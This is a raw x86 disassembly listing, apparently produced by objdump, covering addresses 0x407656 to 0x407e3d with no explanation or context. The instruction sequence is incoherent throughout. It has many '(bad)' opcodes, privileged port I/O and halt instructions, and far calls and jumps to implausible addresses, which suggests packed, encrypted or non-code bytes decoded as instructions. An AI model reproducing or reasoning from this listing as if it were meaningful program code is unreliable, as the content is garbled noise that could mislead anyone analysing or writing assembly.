  407656:	sub    DWORD PTR [esi+0x36aaf958],esi
  40765c:	sub    dh,dh
  40765e:	add    eax,0xdac69aac
  407663:	pop    edx
  407664:	mov    al,ds:0xf78f9443
  407669:	jb     0x407683
  40766b:	inc    esi
  40766c:	cmp    ecx,DWORD PTR gs:[ebx]
  40766f:	inc    edx
  407670:	out    dx,al
  407671:	xchg   ebp,eax
  407672:	sbb    eax,0x25372f83
  407677:	(bad)  
  407678:	pop    edi
  407679:	mov    ds:0x27ce9ce0,al
  40767e:	mov    bh,0x85
  407680:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407681:	dec    ebp
  407682:	iret   
  407683:	mov    ah,0x97
  407685:	sar    dh,1
  407687:	out    0xca,al
  407689:	arpl   WORD PTR es:[edx],dx
  40768c:	jno    0x407676
  40768e:	pop    ebp
  40768f:	mov    eax,0x2c20c2ed
  407694:	dec    ebx
  407695:	lods   al,BYTE PTR ds:[esi]
  407696:	add    esi,DWORD PTR [ebp-0x8]
  407699:	sbb    esp,edi
  40769b:	xor    al,dl
  40769d:	push   esi
  40769e:	sar    DWORD PTR [eax+0x1082eab2],1
  4076a4:	jnp    0x4076dd
  4076a6:	inc    ecx
  4076a7:	mov    ah,0x3f
  4076a9:	pop    esi
  4076aa:	cmp    edi,DWORD PTR [ecx]
  4076ac:	icebp  
  4076ad:	sub    BYTE PTR [edx-0x5b],dl
  4076b0:	cmc    
  4076b1:	rcl    BYTE PTR [edx],0xf4
  4076b4:	in     eax,0x1c
  4076b6:	push   esp
  4076b7:	cmp    eax,0x20ead120
  4076bc:	(bad)  [ebx]
  4076be:	mov    esp,0xaebc1c3f
  4076c3:	xchg   esi,eax
  4076c4:	bound  esi,QWORD PTR [edi]
  4076c6:	stos   BYTE PTR es:[edi],al
  4076c7:	xchg   edi,eax
  4076c8:	inc    esp
  4076c9:	jle    0x4076a4
  4076cb:	inc    esp
  4076cc:	dec    esp
  4076cd:	xor    DWORD PTR [eax],edi
  4076cf:	shr    BYTE PTR [esi-0x648137da],1
  4076d5:	jno    0x4076dc
  4076d7:	mov    dh,0xb0
  4076d9:	dec    eax
  4076da:	fscale 
  4076dc:	add    eax,0xbec2e60b
  4076e1:	xchg   ecx,eax
  4076e2:	mov    DWORD PTR [esi],edx
  4076e4:	imul   edx,DWORD PTR [edx-0x112a3776],0x2fa2db53
  4076ee:	test   DWORD PTR [esi],0x4f2080c6
  4076f4:	fbld   TBYTE PTR [ebx+0x61]
  4076f7:	add    DWORD PTR [ecx],edx
  4076f9:	not    DWORD PTR [ebx+0x55]
  4076fc:	fwait
  4076fd:	aas    
  4076fe:	cmp    edx,DWORD PTR [eax]
  407700:	test   BYTE PTR [edx],dl
  407702:	xchg   edi,eax
  407703:	clc    
  407704:	push   esi
  407705:	repnz and eax,0x97202b40
  40770b:	or     DWORD PTR [esi+0x4c4a79b8],ecx
  407711:	test   DWORD PTR [ebx],ecx
  407713:	(bad)  
  407714:	mov    ebx,0x3435986
  407719:	out    0x91,al
  40771b:	inc    edi
  40771c:	sub    al,0x64
  40771e:	nop
  40771f:	jno    0x407789
  407721:	push   ebp
  407722:	dec    ecx
  407723:	cbw    
  407725:	loope  0x40777a
  407727:	sub    BYTE PTR [ecx+0x53],0xd1
  40772b:	dec    edi
  40772c:	jbe    0x40775e
  40772e:	stos   BYTE PTR es:[edi],al
  40772f:	retf   0xe339
  407732:	pop    ebp
  407733:	inc    ebp
  407734:	mov    dh,0x8c
  407736:	in     al,0x5c
  407738:	shl    BYTE PTR [esi-0x1471084f],cl
  40773e:	call   0x21e4:0x2331bb2f
  407745:	hlt    
  407746:	adc    BYTE PTR [ebp-0x3d0461ac],dh
  40774c:	mov    edx,0x32dec62d
  407751:	add    BYTE PTR [ebx+ebp*8-0x36ba3679],0xbe
  407759:	xor    eax,0xa5626e5d
  40775e:	lea    esp,[edx+0x6f]
  407761:	dec    edx
  407762:	sub    BYTE PTR [ebx+0x68aaaa98],ch
  407768:	push   edx
  407769:	push   ss
  40776a:	and    BYTE PTR [eax],al
  40776c:	or     DWORD PTR [ebx-0x31],ecx
  40776f:	dec    eax
  407770:	mov    ebp,fs
  407772:	dec    esi
  407773:	jecxz  0x40774a
  407775:	xor    al,0xe5
  407777:	push   cs
  407778:	iret   
  407779:	xchg   esp,eax
  40777a:	xchg   esi,eax
  40777b:	xchg   ebp,eax
  40777c:	inc    edx
  40777d:	jge    0x407721
  40777f:	int    0xd5
  407781:	jae    0x4077f3
  407783:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407784:	out    dx,eax
  407785:	out    0xb4,al
  407787:	in     eax,0xca
  407789:	add    ch,BYTE PTR [edi]
  40778b:	and    DWORD PTR [ecx-0x22],edx
  40778e:	popa   
  40778f:	popa   
  407790:	out    dx,eax
  407791:	adc    edx,esi
  407793:	je     0x40779a
  407795:	xchg   edi,eax
  407796:	cmp    al,0xd0
  407798:	leave  
  407799:	cmp    BYTE PTR [eax+0x4599b8c2],al
  40779f:	mov    cs,WORD PTR [esi-0x7f]
  4077a2:	dec    esi
  4077a3:	dec    DWORD PTR [ebp+0x79aa6e15]
  4077a9:	or     BYTE PTR [ecx-0x7cae4e77],bh
  4077af:	(bad)  
  4077b1:	xchg   BYTE PTR [esi+ebp*2-0x15],al
  4077b5:	and    BYTE PTR [ecx+0x457d9ba7],cl
  4077bb:	sub    bl,bh
  4077bd:	repz shr DWORD PTR [edi-0x57],0xf7
  4077c2:	xchg   edi,eax
  4077c3:	div    ah
  4077c5:	inc    edx
  4077c6:	mov    ds:0x916a3a2d,al
  4077cb:	mov    eax,0xf8ada15e
  4077d0:	push   ebx
  4077d1:	fisubr DWORD PTR [edx+0x1b9b24ab]
  4077d7:	std    
  4077d8:	out    0x38,eax
  4077da:	mov    ds:0xefd99a5d,al
  4077df:	mov    edi,0xc0169558
  4077e4:	aaa    
  4077e5:	rcl    BYTE PTR [edi-0x872def7],0xd4
  4077ec:	xor    ecx,DWORD PTR [eax+eax*8+0x54]
  4077f0:	and    eax,0x1caf213e
  4077f5:	data16 loope 0x407787
  4077f8:	retf   0x974d
  4077fb:	push   cs
  4077fc:	iret   
  4077fd:	sub    eax,0x5e3eb623
  407802:	mov    DWORD PTR ds:0xd958390c,ebx
  407808:	leave  
  407809:	sbb    eax,0x23cd53d8
  40780e:	mov    cs,WORD PTR [edx+edx*8+0x70]
  407812:	mov    dh,0x44
  407814:	popa   
  407815:	sub    eax,0x23b67996
  40781a:	call   0x5134:0x3e04e94d
  407821:	mov    ds:0xf722e5da,al
  407826:	call   0x1e42:0xcb1e2c13
  40782d:	inc    esp
  40782e:	and    esp,DWORD PTR ss:[esi]
  407831:	in     al,0x1b
  407833:	pop    ebp
  407834:	cmc    
  407835:	nop
  407836:	je     0x407864
  407838:	sbb    DWORD PTR [ebp+edx*8+0xe],edx
  40783c:	outs   dx,DWORD PTR ds:[esi]
  40783d:	or     DWORD PTR [edi+0x44f27c38],0x3d
  407844:	mov    eax,0x6811ebd
  407849:	out    dx,eax
  40784a:	lds    eax,FWORD PTR es:[eax+0x7a1fa9a8]
  407851:	aam    0x3b
  407853:	mov    WORD PTR [edx],es
  407855:	dec    ebx
  407856:	jns    0x407828
  407858:	and    DWORD PTR [eax],edi
  40785a:	cmp    eax,0xafd9de57
  40785f:	adc    BYTE PTR [edi-0x19],cl
  407862:	xchg   esp,edi
  407864:	xor    esp,DWORD PTR [eax]
  407866:	in     eax,0x2e
  407868:	fwait
  407869:	icebp  
  40786a:	adc    BYTE PTR [eax+ebx*2-0x65128b78],bh
  407871:	iret   
  407872:	outs   dx,BYTE PTR ds:[esi]
  407873:	xchg   ebx,eax
  407874:	xor    DWORD PTR [esi],ecx
  407876:	(bad)  
  407877:	adc    eax,DWORD PTR [esp+ebp*4-0x599e865f]
  40787e:	sub    al,0x87
  407880:	out    dx,al
  407881:	repz push 0x4f
  407884:	cmp    esi,DWORD PTR [edi-0x1985be2f]
  40788a:	xchg   esp,eax
  40788b:	das    
  40788c:	test   eax,0x801fbe74
  407891:	dec    esi
  407892:	aaa    
  407893:	or     dl,BYTE PTR ds:0x81f4d02e
  407899:	push   esp
  40789a:	das    
  40789b:	(bad)  
  40789c:	cld    
  40789d:	xchg   ecx,eax
  40789e:	xchg   esp,eax
  40789f:	nop
  4078a0:	and    bl,0x1
  4078a3:	loope  0x407854
  4078a5:	jg     0x4078cc
  4078a7:	out    0xb9,eax
  4078a9:	aas    
  4078aa:	add    BYTE PTR [edx+0x24c65c7f],bh
  4078b0:	dec    esi
  4078b1:	lods   eax,DWORD PTR ds:[esi]
  4078b2:	mov    es,WORD PTR [edi+edx*8]
  4078b5:	cmp    bl,BYTE PTR [eax]
  4078b7:	and    eax,0x9fc8103c
  4078bc:	adc    ebp,edx
  4078be:	ja     0x4078b5
  4078c0:	scas   al,BYTE PTR es:[edi]
  4078c1:	xchg   edx,eax
  4078c2:	mov    ecx,ds
  4078c4:	and    bl,BYTE PTR [edi+0x47]
  4078c7:	cmp    DWORD PTR [ebx-0x728d2edd],ebp
  4078cd:	mov    eax,ds:0x7ddea0b7
  4078d2:	xchg   ecx,eax
  4078d3:	call   0x7a85:0x41c65d3a
  4078da:	mov    cl,0xe6
  4078dc:	(bad)  
  4078dd:	xor    BYTE PTR [eax],0xda
  4078e0:	sti    
  4078e1:	mov    bl,0x44
  4078e3:	scas   al,BYTE PTR es:[edi]
  4078e4:	pop    ss
  4078e5:	xchg   edi,eax
  4078e6:	mov    edx,0xc9c17507
  4078eb:	jmp    0x453c1218
  4078f0:	ror    esi,cl
  4078f2:	mov    ds:0xe08c7be5,eax
  4078f7:	popf   
  4078f8:	cmp    bh,BYTE PTR [edi-0x3c]
  4078fb:	mov    eax,ebp
  4078fd:	cli    
  4078fe:	xabort 0x6a
  407901:	inc    esp
  407902:	icebp  
  407903:	lods   eax,DWORD PTR ds:[esi]
  407904:	in     eax,dx
  407905:	mov    ds:0xdf26f1ae,al
  40790a:	ja     0x407985
  40790c:	scas   eax,DWORD PTR es:[edi]
  40790d:	mov    dl,BYTE PTR [ecx]
  40790f:	mov    ecx,0x76e0bc3a
  407914:	mov    DWORD PTR [edi-0x6bf16884],edx
  40791a:	mov    ch,BYTE PTR [eax+0x62]
  40791d:	lea    ebx,[edi]
  40791f:	adc    al,0x51
  407921:	add    eax,0x5c01009f
  407926:	ror    dh,1
  407928:	call   0x25edb002
  40792d:	add    eax,0x33f31afa
  407932:	add    bl,BYTE PTR ss:[ebp-0x2d30119d]
  407939:	lods   eax,DWORD PTR ds:[esi]
  40793a:	push   ss
  40793b:	stos   DWORD PTR es:[edi],eax
  40793c:	dec    edx
  40793d:	push   esi
  40793e:	aam    0x5d
  407940:	and    bh,dh
  407942:	mov    al,BYTE PTR [ecx-0x5d7dab8d]
  407948:	fbstp  TBYTE PTR [edi+0x722eb87a]
  40794e:	jno    0x407984
  407950:	arpl   WORD PTR [ecx+0x4b092c3a],ax
  407956:	inc    ebp
  407957:	or     bh,BYTE PTR [esi+edi*2]
  40795a:	(bad)  
  40795c:	aam    0x3c
  40795e:	adc    bl,BYTE PTR [esi+ebp*1+0x3393d13c]
  407965:	mov    edx,0xdb8271a
  40796a:	push   0x3b229336
  40796f:	sbb    eax,0xcab74879
  407974:	or     esp,0xffffffba
  407977:	int3   
  407978:	dec    ebp
  407979:	idiv   DWORD PTR [ebx-0x441859d8]
  40797f:	xchg   edi,eax
  407980:	fldl2t 
  407982:	fsubr  QWORD PTR [esp+ebp*8+0x78138747]
  407989:	dec    ebp
  40798a:	aaa    
  40798b:	test   BYTE PTR [esi-0x58],ah
  40798e:	xchg   edi,eax
  40798f:	sbb    al,0x60
  407991:	dec    esp
  407992:	adc    esp,ebx
  407994:	test   eax,0x775c0e24
  407999:	jle    0x4079e7
  40799b:	imul   ecx,edx,0x9ee2b6df
  4079a1:	loope  0x4079d4
  4079a3:	inc    edx
  4079a4:	out    dx,al
  4079a5:	ret    0x175e
  4079a8:	inc    eax
  4079a9:	clc    
  4079aa:	jnp    0x4079d4
  4079ac:	test   BYTE PTR [edi-0x43],bh
  4079af:	push   ss
  4079b0:	mov    dh,0x83
  4079b2:	mov    ds:0x9cf24523,eax
  4079b7:	call   0xebaf:0x1f0ff7dd
  4079be:	lods   al,BYTE PTR ds:[esi]
  4079bf:	adc    al,0xe7
  4079c1:	sahf   
  4079c2:	or     BYTE PTR [edi],bh
  4079c4:	and    eax,0xb5258339
  4079c9:	or     BYTE PTR [bx+di+0x5ede],dh
  4079ce:	fnstsw WORD PTR [edx]
  4079d0:	or     BYTE PTR [ecx-0x41],cl
  4079d3:	xor    eax,0xe70ceabd
  4079d8:	cmp    DWORD PTR [eax+0x1b667ba],edi
  4079de:	cmp    bl,ah
  4079e0:	fcomp  DWORD PTR [ebp+0x7d]
  4079e3:	es push edx
  4079e5:	mov    al,ds:0xe967eebd
  4079ea:	push   esp
  4079eb:	inc    ecx
  4079ec:	ins    DWORD PTR es:[edi],dx
  4079ed:	adc    cl,BYTE PTR ds:[edx-0x6cec1816]
  4079f4:	es cli 
  4079f6:	or     cl,0xd6
  4079f9:	fs cli 
  4079fb:	sti    
  4079fc:	lahf   
  4079fd:	ret    
  4079fe:	jmp    0x4079a7
  407a00:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407a01:	push   ecx
  407a02:	loop   0x407a1b
  407a04:	jno    0x4079b9
  407a06:	dec    ebp
  407a07:	sahf   
  407a08:	or     ebx,DWORD PTR [ebx-0x34]
  407a0b:	push   ebp
  407a0c:	or     dh,BYTE PTR [ebx+eax*1+0x54]
  407a10:	mov    cl,0x39
  407a12:	cmp    cl,bl
  407a14:	sbb    al,0x40
  407a16:	pop    ds
  407a17:	stc    
  407a18:	das    
  407a19:	pop    esi
  407a1a:	xor    DWORD PTR [ebp-0x1f5e1581],0xffffffcb
  407a21:	dec    ecx
  407a22:	push   0xffffffc1
  407a24:	stc    
  407a25:	in     eax,dx
  407a26:	xor    ah,BYTE PTR [ebp-0x2d2025ec]
  407a2c:	add    DWORD PTR [ebp+0x10],0xc6e9e5f0
  407a33:	and    ebp,DWORD PTR [edi]
  407a35:	jns    0x407a7b
  407a37:	into   
  407a38:	sbb    ebx,ebx
  407a3a:	stos   DWORD PTR es:[edi],eax
  407a3b:	push   0x8b64fa36
  407a40:	(bad)  
  407a41:	(bad)  
  407a43:	jecxz  0x407ac0
  407a45:	xor    DWORD PTR [edx],ebp
  407a47:	retf   0x6b1
  407a4a:	and    DWORD PTR [ecx],ebx
  407a4c:	ret    0x759a
  407a4f:	sahf   
  407a50:	xor    dl,BYTE PTR [esi-0x5a]
  407a53:	(bad)  ds:0x858b927b
  407a59:	pusha  
  407a5a:	sub    ebp,DWORD PTR [ecx+0x2da0e3e4]
  407a60:	iret   
  407a61:	(bad)  
  407a62:	cli    
  407a63:	pop    edx
  407a64:	in     eax,dx
  407a65:	mov    WORD PTR [ebp-0x27e3dd99],fs
  407a6b:	inc    ebx
  407a6c:	jno    0x407a1b
  407a6e:	jmp    0x660cc219
  407a73:	or     BYTE PTR [eax-0x2594b60],ch
  407a79:	popf   
  407a7a:	shl    BYTE PTR [ebx+0x1d38e4c3],cl
  407a80:	neg    BYTE PTR [eax+ecx*1]
  407a83:	retf   
  407a84:	xchg   DWORD PTR [eax+eax*1-0x31],ebx
  407a88:	jecxz  0x407a73
  407a8a:	ret    
  407a8b:	in     eax,0xe6
  407a8d:	sub    al,0xb1
  407a8f:	push   eax
  407a90:	sbb    DWORD PTR [esi],esp
  407a92:	int    0xf8
  407a94:	adc    esp,edi
  407a96:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407a97:	mov    al,ds:0xbcbf221e
  407a9c:	jecxz  0x407a66
  407a9e:	pop    edx
  407a9f:	fsub   QWORD PTR [ecx+0x45353327]
  407aa5:	jne    0x407a39
  407aa7:	pop    es
  407aa8:	inc    ebx
  407aa9:	mov    esp,0xf2585456
  407aae:	test   eax,0xffa83965
  407ab3:	mov    ds:0xe750ae2a,al
  407ab8:	fiadd  WORD PTR [ecx+edi*1]
  407abb:	fdiv   DWORD PTR [ebx+edx*4-0x65]
  407abf:	loope  0x407ac5
  407ac1:	mov    ecx,DWORD PTR [ebx+0x11]
  407ac4:	pop    ecx
  407ac5:	xchg   ebp,eax
  407ac6:	pop    ebx
  407ac7:	xchg   ecx,eax
  407ac8:	mov    al,0x21
  407aca:	scas   eax,DWORD PTR es:[edi]
  407acb:	sbb    BYTE PTR [edi+edi*2],bh
  407ace:	sub    BYTE PTR [esi+0x2b3f5680],0xdf
  407ad5:	dec    esi
  407ad6:	mov    ds:0x61d7cbfb,al
  407adb:	gs or  esp,DWORD PTR ss:[eax]
  407adf:	daa    
  407ae0:	pop    ds
  407ae1:	stc    
  407ae2:	retf   
  407ae3:	inc    edx
  407ae4:	pop    ebx
  407ae5:	ds push esp
  407ae7:	fild   QWORD PTR [eax-0x1b]
  407aea:	xor    al,0x4d
  407aec:	inc    ecx
  407aed:	mov    cl,BYTE PTR [ebx]
  407aef:	out    dx,eax
  407af0:	sbb    eax,DWORD PTR [ecx]
  407af2:	mov    ah,0x4c
  407af4:	mov    cl,0x1f
  407af6:	xchg   edi,eax
  407af7:	sub    al,0xe4
  407af9:	(bad)  
  407afa:	cmc    
  407afb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407afc:	call   0xaa0e:0x49c08c69
  407b03:	ins    BYTE PTR es:[edi],dx
  407b04:	mov    dh,0xa2
  407b06:	add    eax,0xf83e3f11
  407b0b:	(bad)  
  407b0c:	out    0x1f,al
  407b0e:	jnp    0x407ac6
  407b10:	ds sbb al,0x46
  407b13:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407b14:	mov    BYTE PTR [esi-0x63],0x95
  407b18:	jl     0x407ae0
  407b1a:	jns    0x407adb
  407b1c:	aam    0x59
  407b1e:	mov    ch,al
  407b20:	(bad)  
  407b21:	pop    esp
  407b22:	fisttp WORD PTR [ebp+ebp*2+0x15039f9d]
  407b29:	xor    esp,0xfffffff0
  407b2c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407b2d:	sub    al,0xe9
  407b2f:	scas   al,BYTE PTR es:[edi]
  407b30:	sub    eax,0x36b20f4
  407b35:	xor    cl,al
  407b37:	pop    edx
  407b38:	xor    eax,0x6e0cc7ee
  407b3d:	xchg   edx,eax
  407b3e:	in     eax,0x28
  407b40:	inc    ecx
  407b41:	add    esi,DWORD PTR [esi-0x26]
  407b44:	lock mov cl,0x9f
  407b47:	rcr    BYTE PTR [esi-0x21],cl
  407b4a:	or     al,0xda
  407b4c:	pop    ds
  407b4d:	push   esi
  407b4e:	call   0xca474a24
  407b53:	add    eax,0xb0e158dc
  407b58:	adc    eax,0xeb0965ac
  407b5d:	sub    BYTE PTR [ecx-0x80],bh
  407b60:	repnz mov ds:0xae96b5a0,al
  407b66:	cli    
  407b67:	inc    bx
  407b69:	dec    ecx
  407b6a:	mov    BYTE PTR [esp+ebp*8+0x6e04afae],ch
  407b71:	jmp    0x860613f4
  407b76:	mov    ah,0x1b
  407b78:	jmp    FWORD PTR [ebp-0x46]
  407b7b:	lock and eax,0x8bd4e3dc
  407b81:	jg     0x407b4d
  407b83:	popf   
  407b84:	sbb    BYTE PTR [edx],0x26
  407b87:	dec    eax
  407b88:	arpl   bx,cx
  407b8a:	xchg   DWORD PTR [ebx],eax
  407b8c:	push   eax
  407b8d:	aad    0x7f
  407b8f:	mov    eax,0x3720d48b
  407b94:	fsub   QWORD PTR [ecx]
  407b96:	out    dx,al
  407b97:	jmp    0x7948:0x5e5a386d
  407b9e:	dec    edx
  407b9f:	out    dx,al
  407ba0:	mov    dh,BYTE PTR [eax+0x2db3ed7c]
  407ba6:	test   BYTE PTR [edi],dl
  407ba8:	mov    edi,0xaf9e2146
  407bad:	lods   al,BYTE PTR ds:[esi]
  407bae:	repnz sahf 
  407bb0:	repz into 
  407bb2:	cmp    BYTE PTR ds:0x780488fa,dl
  407bb8:	inc    esi
  407bb9:	cmc    
  407bba:	or     al,0xf1
  407bbc:	pop    edx
  407bbd:	jecxz  0x407beb
  407bbf:	mov    esi,0x5227fd17
  407bc4:	mov    ecx,0x81b677d0
  407bc9:	aad    0x6d
  407bcb:	loop   0x407b95
  407bcd:	xor    edx,0x20
  407bd0:	daa    
  407bd1:	sbb    DWORD PTR [edx+0xa],edx
  407bd4:	ror    DWORD PTR ds:0x4da524be,0x61
  407bdb:	xor    ebp,DWORD PTR [edx-0x3a]
  407bde:	(bad)  [esi-0x54bd87e0]
  407be4:	clc    
  407be5:	ret    
  407be6:	je     0x407c58
  407be8:	enter  0xd215,0xba
  407bec:	mov    ds:0x69d68e31,eax
  407bf1:	imul   esp,DWORD PTR [ecx-0x4f5095ce],0xffffffc3
  407bf8:	dec    edi
  407bf9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407bfa:	icebp  
  407bfb:	mov    cl,0x79
  407bfd:	xlat   BYTE PTR ds:[ebx]
  407bfe:	aad    0xb4
  407c00:	loop   0x407c80
  407c02:	mov    ah,0xe2
  407c04:	jno    0x407bee
  407c06:	mov    al,0x7e
  407c08:	maskmovq mm6,(bad)
  407c09:	div    DWORD PTR [eax-0x5e]
  407c0c:	repnz inc ebp
  407c0e:	aas    
  407c0f:	iret   
  407c10:	cmp    eax,0x4df36610
  407c15:	and    al,0x57
  407c17:	jle    0x407be7
  407c19:	cwde   
  407c1a:	aas    
  407c1b:	(bad)  
  407c1c:	cwde   
  407c1d:	(bad)  
  407c1f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407c20:	jge    0x407c6d
  407c22:	inc    ebp
  407c23:	mov    cl,0x3d
  407c25:	mov    ah,0x86
  407c27:	shl    DWORD PTR [ebp+0x4],1
  407c2a:	push   ss
  407c2b:	popa   
  407c2c:	cmp    dh,bl
  407c2e:	lds    ecx,FWORD PTR [eax+0x2f4cb10f]
  407c34:	stos   BYTE PTR es:[edi],al
  407c35:	mov    ch,0x46
  407c37:	jae    0x407c01
  407c39:	adc    DWORD PTR ds:0xe832ee22,0xffffffdf
  407c40:	mov    ds:0x5c032b5,al
  407c45:	(bad)  
  407c46:	push   0x5689745
  407c4b:	pop    esp
  407c4c:	(bad)  
  407c4e:	pop    ecx
  407c4f:	call   0xefb4:0x207a5656
  407c56:	call   0xddae:0x2b9d953
  407c5d:	aas    
  407c5e:	fwait
  407c5f:	xchg   esi,eax
  407c60:	loop   0x407c31
  407c62:	pop    edx
  407c63:	add    eax,ebx
  407c65:	sub    ah,BYTE PTR [ebx]
  407c67:	call   0x2b8c:0x57fca36f
  407c6e:	aam    0xd5
  407c70:	mov    ebx,0x92a2ebbb
  407c75:	retf   
  407c76:	adc    al,0x15
  407c78:	jb     0x407c77
  407c7a:	mov    al,ds:0xa9764a68
  407c7f:	adc    al,0x18
  407c81:	fldcw  WORD PTR ss:[ebx-0x76781c72]
  407c88:	ret    0xa551
  407c8b:	push   ecx
  407c8c:	cmp    cl,BYTE PTR [edi-0x33]
  407c8f:	or     edx,edi
  407c91:	ret    
  407c92:	mov    edx,0xbfb6b4fb
  407c97:	repnz xor al,0xdb
  407c9a:	ss js  0x407c38
  407c9d:	aaa    
  407c9e:	pop    edx
  407c9f:	jmp    0x407cda
  407ca1:	mov    ecx,0xc8b9a5e9
  407ca6:	sar    DWORD PTR [eax-0x3],cl
  407ca9:	and    DWORD PTR [ebp-0x442b122b],eax
  407caf:	push   ebx
  407cb0:	jp     0x407d03
  407cb2:	leave  
  407cb3:	rcr    dh,1
  407cb5:	push   ds
  407cb6:	pop    ss
  407cb7:	mov    esp,0xea93fb00
  407cbc:	cli    
  407cbd:	cs cmp ah,ch
  407cc0:	push   eax
  407cc1:	adc    al,0x2
  407cc3:	fidiv  DWORD PTR [esi+esi*8-0x48]
  407cc7:	into   
  407cc8:	sbb    cl,BYTE PTR [esi]
  407cca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407ccb:	add    eax,0x59a4b514
  407cd0:	sub    al,0xc1
  407cd2:	mov    ds:0x4a1b2ba8,al
  407cd7:	xchg   ebx,eax
  407cd8:	push   ecx
  407cd9:	pushf  
  407cda:	(bad)  
  407cdc:	jp     0x407ca0
  407cde:	arpl   bx,ax
  407ce0:	(bad)  
  407ce1:	xor    edx,DWORD PTR [ebx+ebp*8-0x80]
  407ce5:	mov    ecx,DWORD PTR [esi+0x2e]
  407ce8:	fld    QWORD PTR [ebx+ebp*8+0x67]
  407cec:	adc    DWORD PTR [eax],0xa5decd8d
  407cf2:	add    bl,BYTE PTR [ecx]
  407cf4:	(bad)  
  407cf5:	imul   esi,DWORD PTR [esi],0xc0c11bd6
  407cfb:	retf   0x7c80
  407cfe:	jmp    0x407d7b
  407d00:	in     al,dx
  407d01:	cmp    DWORD PTR [edi-0xece16a0],0xffffffda
  407d08:	mov    edi,0xa70e4831
  407d0d:	cmp    edi,DWORD PTR [ecx+0x1b24dc27]
  407d13:	inc    esi
  407d14:	dec    eax
  407d15:	(bad)  
  407d16:	jb     0x407d50
  407d18:	sbb    ebx,esp
  407d1a:	or     DWORD PTR [ebx-0x1a],edx
  407d1d:	pop    ecx
  407d1e:	xor    ah,BYTE PTR [eiz*4-0x71b512d8]
  407d25:	aam    0x85
  407d27:	adc    DWORD PTR [eax-0x63],esp
  407d2a:	out    dx,eax
  407d2b:	mov    esi,ds
  407d2d:	not    cl
  407d2f:	out    dx,al
  407d30:	nop
  407d31:	add    BYTE PTR [ebp+0x47],dl
  407d34:	add    ebx,DWORD PTR [eax-0x5d0a4d23]
  407d3a:	pop    esi
  407d3b:	imul   BYTE PTR [ecx-0x72]
  407d3e:	jae    0x407cc2
  407d40:	in     al,dx
  407d41:	mov    DWORD PTR [ecx+0x73],ebp
  407d44:	pushf  
  407d45:	or     DWORD PTR [ebp-0x6e],edx
  407d48:	adc    al,BYTE PTR [edi+0x1d31bacc]
  407d4e:	std    
  407d4f:	int    0xe7
  407d51:	and    DWORD PTR [edi-0x6f20df7],ebp
  407d57:	out    dx,al
  407d58:	sbb    ecx,DWORD PTR [edx-0x63]
  407d5b:	mov    dh,0xcb
  407d5d:	mov    ds:0x464fac34,eax
  407d62:	mov    ch,0x5
  407d64:	(bad)  
  407d65:	daa    
  407d66:	cdq    
  407d67:	mov    dh,BYTE PTR [edx-0x44ea9686]
  407d6d:	lea    esi,[esp+ebp*8-0x3a]
  407d71:	sub    eax,0xdd0b170c
  407d76:	jno    0x407d54
  407d78:	stc    
  407d79:	sbb    al,0x4e
  407d7b:	or     BYTE PTR [edi-0x7a5fe093],cl
  407d81:	mov    ds:0x93ec78c2,al
  407d86:	jae    0x407df1
  407d88:	push   esi
  407d89:	test   dl,ah
  407d8b:	jp     0x407d35
  407d8d:	or     al,bh
  407d8f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407d90:	and    DWORD PTR [ebx],0x5070f270
  407d96:	ins    BYTE PTR es:[edi],dx
  407d97:	int3   
  407d98:	mov    gs,WORD PTR [edx+esi*1-0x4ed153ca]
  407d9f:	jns    0x407d28
  407da1:	adc    eax,DWORD PTR [eax+0x34]
  407da4:	sub    ch,BYTE PTR [edx+0x4d]
  407da7:	bound  eax,QWORD PTR [ebp-0x4c34313a]
  407dad:	or     al,0x8c
  407daf:	add    BYTE PTR [edx+0x29],cl
  407db2:	repnz in al,0xcd
  407db5:	std    
  407db6:	push   esi
  407db7:	mov    cl,0xdb
  407db9:	mov    gs,WORD PTR [eax-0x4d174e81]
  407dbf:	jne    0x407d6d
  407dc1:	inc    esp
  407dc2:	(bad)  
  407dc3:	daa    
  407dc4:	popf   
  407dc5:	push   cs
  407dc6:	fdiv   st(3),st
  407dc8:	push   edi
  407dc9:	adc    al,0x26
  407dcb:	aad    0xe
  407dcd:	jmp    0xbf36:0xc6fac1d6
  407dd4:	ins    BYTE PTR es:[edi],dx
  407dd5:	or     BYTE PTR [ebp+ebp*2-0x7f7d6e3e],dl
  407ddc:	fwait
  407ddd:	nop
  407dde:	pop    esi
  407ddf:	outs   dx,DWORD PTR ds:[esi]
  407de0:	clc    
  407de1:	xchg   esp,eax
  407de2:	xchg   BYTE PTR [ebp+0x4f3cd433],cl
  407de8:	push   ecx
  407de9:	into   
  407dea:	lock test eax,0x7f1d931c
  407df0:	jne    0x407dfa
  407df2:	sbb    BYTE PTR [ebx-0x38c4a284],cl
  407df8:	in     al,dx
  407df9:	jmp    0x407dae
  407dfb:	stos   DWORD PTR es:[edi],eax
  407dfc:	lock mov eax,ds:0xbb772af
  407e02:	outs   dx,BYTE PTR ds:[esi]
  407e03:	cwde   
  407e04:	mov    cl,0x6
  407e06:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407e07:	inc    ebx
  407e08:	mov    ds:0xff9e7aa9,al
  407e0d:	test   al,0xc9
  407e0f:	sub    BYTE PTR [ebx],al
  407e11:	xchg   esi,eax
  407e12:	inc    ebp
  407e13:	popw   ss
  407e15:	mov    eax,0xcf18ae6f
  407e1a:	jmp    0xfb8:0x7d8a89d6
  407e21:	lock stos DWORD PTR es:[edi],eax
  407e23:	sub    eax,0x245df21b
  407e28:	hlt    
  407e29:	pop    edx
  407e2a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407e2b:	sar    DWORD PTR [ebp-0x79],cl
  407e2e:	inc    edi
  407e2f:	clc    
  407e30:	mov    esi,0x6283f484
  407e35:	mov    dh,0xa
  407e37:	jno    0x407e77
  407e39:	xor    al,0xae
  407e3b:	aaa    
  407e3c:	ins    BYTE PTR es:[edi],dx
  407e3d:	lods   al,BYTE PTR ds:[esi]
